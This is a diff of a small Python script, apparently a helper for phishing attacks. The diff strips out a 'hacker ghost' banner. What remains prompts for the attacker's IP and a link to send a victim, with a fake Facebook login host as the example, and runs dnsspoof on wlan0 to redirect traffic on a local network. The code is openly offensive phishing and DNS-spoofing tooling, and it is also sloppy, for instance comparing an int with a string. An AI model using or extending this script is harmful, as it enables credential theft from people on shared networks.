@@ -2,23 +2,6 @@ from os import system
 import sys
 
 
-def logo():
-
-
-
-  print ("=======================================================")
-  print ("=        create by hacker ghost                       =")
-  print ("=======================================================")
-  print ("=        Assist for phishing tools                    =")
-  print ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++")
-  print ("=                     V.1.2                           =")
-  print ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++")
-  print ("=      telegram https://t.me/hackerghost              =")
-  print ("=======================================================")
-
-  system('clear')
-  
-  logo()
 print ("[1] start the attack")
 print ("[2]exit")
 option = input("==>")
@@ -26,10 +9,10 @@ if option == 1:
     system("clear")
 else:
     system("clear")
-    logo()
     print ("thanks for using the tool")
     exit()
-logo()
+
+
 print ("Enter your ipaddres to redirected to")
 print ("Next enter the link that you want to send to victim")
 print ("Dont forget to make space beetwen yourip and link EX:-192.168.200.130  sevice.login.facebook") 
@@ -55,7 +38,5 @@ if option2 == 2:
   system("dnsspoof  -i wlan0 -f hosts.txt")
 if option2 == 3:
   system("clear")
-       logo()
   print ("thanks for using the tool")
   exit()
-
